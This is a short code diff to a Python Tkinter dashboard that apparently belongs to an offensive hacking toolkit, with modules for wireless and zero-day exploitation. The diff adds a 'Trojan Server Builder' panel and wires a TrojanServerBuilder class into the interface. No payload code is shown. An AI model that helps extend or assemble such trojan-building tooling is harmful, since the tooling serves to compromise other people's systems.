@@ -33,6 +33,7 @@ from modules.wireless_exploitation import WirelessExploitation
 from modules.zero_day_exploits import ZeroDayExploits
 from backend.code_parser import CodeParser
 from backend.pipeline_manager import PipelineManager
+from modules.trojans.trojan_servers.trojan_server_builder.trojan_server_builder import TrojanServerBuilder
 
 class Dashboard:
     def __init__(self, root):
@@ -63,6 +64,11 @@ class Dashboard:
         self.settings_frame.pack(fill="both", expand=True, padx=10, pady=10)
 
         self.add_settings_dashboards()
+
+        self.trojan_server_builder_frame = ttk.LabelFrame(self.root, text="Trojan Server Builder")
+        self.trojan_server_builder_frame.pack(fill="both", expand=True, padx=10, pady=10)
+
+        self.add_trojan_server_builder()
 
     def update_chart(self):
         fig = Figure(figsize=(8, 6), dpi=100)
@@ -198,6 +204,10 @@ class Dashboard:
 
         download_button = ttk.Button(self.settings_frame, text="Download .zip", command=self.download_zip)
         download_button.pack(pady=5)
+
+    def add_trojan_server_builder(self):
+        trojan_server_builder = TrojanServerBuilder(self.trojan_server_builder_frame)
+        trojan_server_builder.create_widgets()
 
     def continue_response(self):
         print("Continue button clicked")
